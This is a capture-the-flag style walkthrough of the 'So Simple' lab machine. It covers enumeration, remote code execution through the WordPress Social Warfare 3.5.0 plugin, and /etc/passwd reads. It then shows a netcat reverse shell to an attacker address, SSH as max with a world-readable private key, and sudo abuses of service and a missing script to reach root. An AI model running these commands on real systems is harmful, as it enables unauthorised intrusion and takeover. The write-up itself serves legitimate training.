First start enumeration with nmap

```
# Nmap 7.93 scan initiated Fri Mar 10 19:18:26 2023 as: nmap -sC -sV -oN normal.tcp -p 22,80 -Pn 192.168.63.78
Nmap scan report for 192.168.63.78
Host is up (0.16s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 5b5543efafd03d0e63207af4ac416a45 (RSA)
|   256 53f5231be9aa8f41e218c6055007d8d4 (ECDSA)
|_  256 55b77b7e0bf54d1bdfc35da1d768a96b (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: So Simple
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Mar 10 19:18:41 2023 -- 1 IP address (1 host up) scanned in 15.40 seconds
```

![image](https://user-images.githubusercontent.com/87468669/224396578-038df6c4-f994-44ef-9faa-abbe0d196784.png)

noticed a web server running on port `80`, opening it on a browser directed us to an homepage with an image `sosimple`. let's fuzz for hidden dir.

```
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/PG/Sosimple]
└─$ dirsearch -u http://192.168.63.78/ -w /usr/share/wordlists/dirb/common.txt -e php,txt,bak,tar,js,zip

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, txt, bak, tar, js, zip | HTTP method: GET | Threads: 30 | Wordlist size: 4613

Output File: /home/n16hth4wk/.dirsearch/reports/192.168.63.78/-_23-03-10_19-34-54.txt

Error Log: /home/n16hth4wk/.dirsearch/logs/errors-23-03-10_19-34-54.log

Target: http://192.168.63.78/

[19:34:55] Starting: 
[19:35:21] 200 -  495B  - /index.html                                       
[19:35:45] 403 -  278B  - /server-status                                    
[19:35:57] 301 -  318B  - /wordpress  ->  http://192.168.63.78/wordpress/   
                                                                             
Task Completed
```
cool we got a `wordpress` directory, let's check it out.

![image](https://user-images.githubusercontent.com/87468669/224399057-b354d6b8-a408-4ed2-9c15-8c4adad62568.png)

navigating to the `/wordpress` directory we can see it is running a wordpress cms. let's check the source page

![image](https://user-images.githubusercontent.com/87468669/224400563-da92235a-3644-41d1-a0ab-2aa93b451ba4.png)

viewing the source page we can see it is running `Social Warfare v3.5.0` plugin, let's search for an exploit to this plugin. 

```
1. Create payload file and host it on a location accessible by a targeted website. Payload content : "<pre>system('cat /etc/passwd')</pre>"

2. Visit http://192.168.63.78/wordpress/wp-admin/admin-post.php?rce=id&swp_debug=load_options&swp_url=http://192.168.49.63/payload.txt"

3. Content of /etc/passwd will be returned 
```

![image](https://user-images.githubusercontent.com/87468669/224411864-0e1e5fab-2ec4-4bdd-889d-97beffa6d163.png)

cool we got RCE, let's replace our `payload.txt` file with a reverse shell.

reverse shell payload: 

```
<pre>system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.49.63 8080 >/tmp/f')</pre>
```

![image](https://user-images.githubusercontent.com/87468669/224412307-958ee1e1-a2d4-4d97-8052-b57ab158258e.png)

ncat listener ready.

```
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/PG/Sosimple]
└─$ ncat -lnvp 8080 
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::8080
Ncat: Listening on 0.0.0.0:8080
Ncat: Connection from 192.168.63.78.
Ncat: Connection from 192.168.63.78:52888.
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
```
Boom we got a reverse shell.


## Privilege escalation

```
www-data@so-simple:/home/max$ cd .ssh/                                                                                                                            [2/2]
www-data@so-simple:/home/max/.ssh$ ls -al                                                                                                                              
total 20                                                                                                                                                               
drwxr-xr-x 2 max  max  4096 Jul 14  2020 .
drwxr-xr-x 7 max  max  4096 Aug 22  2020 ..
-rw-r--r-- 1 max  max   568 Jul 14  2020 authorized_keys
-rwxr-xr-x 1 root root 2602 Jul 14  2020 id_rsa
-rw-r--r-- 1 root root  568 Jul 14  2020 id_rsa.pub
www-data@so-simple:/home/max/.ssh$ ssh -i id_rsa max@localhost 
Could not create directory '/var/www/.ssh'.
The authenticity of host 'localhost (127.0.0.1)' can't be established.
ECDSA key fingerprint is SHA256:qo4/EbrJueKB3ta+XB6PT2uNDjKfSgixhQqawjkTPas.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Failed to add the host to the list of known hosts (/var/www/.ssh/known_hosts).
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-40-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Mar 10 20:26:52 UTC 2023

  System load:  0.0               Processes:                177
  Usage of /:   53.4% of 8.79GB   Users logged in:          1
  Memory usage: 27%               IPv4 address for docker0: 172.17.0.1
  Swap usage:   0%                IPv4 address for ens160:  192.168.63.78


47 updates can be installed immediately.
0 of these updates are security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Fri Mar 10 20:24:02 2023 from 127.0.0.1
max@so-simple:~$ 

```
found an `id_rsa` key file in user max `.ssh` directory. so ssh using the `id_rsa` key file and boom we ot shell as user max. let's escalate privs further.

```
max@so-simple:~$ sudo -l
Matching Defaults entries for max on so-simple:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User max may run the following commands on so-simple:
    (steven) NOPASSWD: /usr/sbin/service
max@so-simple:~$
```
checking sudo privs for user `max`, we can see that user `max` is allowed to run sudo on `/usr/sbin/service` as user `steven`. let's abuse this priv

```
max@so-simple:~$ sudo -u steven /usr/sbin/service
Usage: service < option > | --status-all | [ service_name [ command | --full-restart ] ]
max@so-simple:~$ sudo -u steven /usr/sbin/service ../../bin/bash
steven@so-simple:/$ id
uid=1001(steven) gid=1001(steven) groups=1001(steven)
steven@so-simple:/$ whoami 
steven
steven@so-simple:/$ 
```
abusing this priv by just typing command `sudo -u steven /usr/sbin/service ../../bin/bash` , we got shell as user steven. let's escalate privs further.

```
steven@so-simple:/home/steven$ sudo -l
Matching Defaults entries for steven on so-simple:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User steven may run the following commands on so-simple:
    (root) NOPASSWD: /opt/tools/server-health.sh
steven@so-simple:/home/steven$ ls -al /opt/tools/server-health.sh
ls: cannot access '/opt/tools/server-health.sh': No such file or directory
steven@so-simple:/home/steven$ 
```
checking sudo privs for user `steven` we can see that we are allowed to run `/opt/tools/server-health.sh` as root without password. and also we noticed that the file does not exist, let create a file `server-health.sh` in the `/opt/tool` dir, and inject a malicious suid code into it.

```
steven@so-simple:/opt/tools$ touch server-health.sh
steven@so-simple:/opt/tools$ ls
server-health.sh
steven@so-simple:/opt/tools$ echo "chmod +s /bin/bash" > server-health.sh 
steven@so-simple:/opt/tools$ chmod +x server-health.sh 
steven@so-simple:/opt/tools$ sudo /opt/tools/server-health.sh 
steven@so-simple:/opt/tools$ ls -al /bin/bash
-rwsr-sr-x 1 root root 1183448 Feb 25  2020 /bin/bash
steven@so-simple:/opt/tools$ /bin/bash -p
bash-5.0# id
uid=1001(steven) gid=1001(steven) euid=0(root) egid=0(root) groups=0(root),1001(steven)
bash-5.0# 
```
created an suid bin that will get us root shell in the `/opt/tools/server-health.sh` file. so running the file as root, got use an suid for `bin/bash` then running `/bin/bash -p` got us root shell.

![image](https://user-images.githubusercontent.com/87468669/224429454-b7f29007-af3b-45b7-bb7e-f300f03d378d.png)

and we are through... 😉
